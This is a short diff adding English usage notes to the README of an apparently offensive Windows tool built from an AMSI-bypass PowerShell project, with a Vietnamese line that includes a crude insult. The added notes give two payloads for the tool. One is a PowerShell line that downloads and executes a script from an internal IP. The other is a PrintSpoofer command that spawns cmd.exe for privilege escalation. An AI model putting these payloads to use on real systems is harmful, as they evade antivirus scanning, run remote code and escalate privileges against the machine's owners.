@@ -24,3 +24,20 @@ Có 2 trường hợp của tool:
 Kiểm tra kỹ năng óc chó khi không có bố Tùng: 
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 
+
+
+# English
+
+complied from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell.
+
+Run god3.exe C:\User\Public\Desktop\payload.txt
+
+payload.txt: powershell -Sta -Nop -Command "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.121/gg.sp1')"
+    
+or
+    
+payload.txt: C:\User\Public\Desktop\PrintSpoofer64.exe -c "cmd.exe"
+
+
+
+
